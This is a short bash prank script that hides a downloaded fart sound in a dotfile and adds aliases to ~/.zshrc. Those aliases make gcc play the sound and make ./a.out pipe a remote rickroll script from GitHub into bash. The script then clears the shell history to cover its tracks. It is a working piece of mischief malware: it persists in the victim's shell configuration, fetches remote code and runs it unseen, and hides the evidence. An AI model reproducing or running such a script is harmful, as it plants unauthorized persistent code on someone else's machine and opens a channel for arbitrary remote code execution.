#!/bin/bash
curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/perfect-fart.mp3 -o ~/.gg.mp3
echo "alias gcc='(afplay --volume 180 ~/.gg.mp3 &) && gcc \$1'" >> ~/.zshrc
echo "alias ./a.out='curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash && ./a.out \$1'" >> ~/.zshrc
history -c
